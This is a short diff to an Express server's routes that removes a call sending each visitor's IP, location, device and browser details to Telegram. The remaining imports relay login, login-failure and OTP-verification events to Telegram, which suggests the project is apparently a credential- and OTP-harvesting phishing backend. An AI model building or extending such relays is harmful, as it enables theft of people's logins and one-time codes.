@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
-import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyVisitor } from "./telegram";
+import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure } from "./telegram";
 import { sendVisitorCard } from "./telegram-bot";
 import { UAParser } from "ua-parser-js";
 import { db } from "./db";
@@ -372,11 +372,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } catch (dbError) {
         console.error("Failed to save visitor to database:", dbError);
       }
-      
-      // Send notification to Telegram (async, don't wait for result)
-      notifyVisitor(ip, country, device, browser, os, page || 'Unknown', language).catch(err => {
-        console.error("❌ CRITICAL: Failed to send visitor notification to Telegram:", err);
-      });
       
       // Return session ID to client
       res.json({ success: true, sessionId: visitorSessionId });
